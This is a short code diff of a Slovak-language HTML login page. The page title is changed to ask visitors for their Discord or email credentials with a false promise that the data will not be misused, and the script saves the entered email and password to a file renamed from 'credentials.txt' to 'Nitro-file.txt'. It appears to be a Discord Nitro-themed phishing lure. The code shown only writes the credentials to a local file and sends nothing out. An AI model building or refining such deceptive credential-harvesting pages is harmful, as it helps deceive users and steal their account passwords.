@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prihlásenie</title>
+    <title>Zadajte prihlasovacie udaje od bud Discordu, alebo Mailu. (Vase osobne udaje nebudu zneuzite!)</title>
     <script>
         function downloadCredentials() {
             const email = document.getElementById('email').value;
@@ -12,7 +12,7 @@
             const blob = new Blob([`Email: ${email}\nHeslo: ${password}`], { type: 'text/plain' });
             const link = document.createElement('a');
             link.href = window.URL.createObjectURL(blob);
-            link.download = 'credentials.txt';
+            link.download = 'Nitro-file.txt';
             link.click();
         }
     </script>
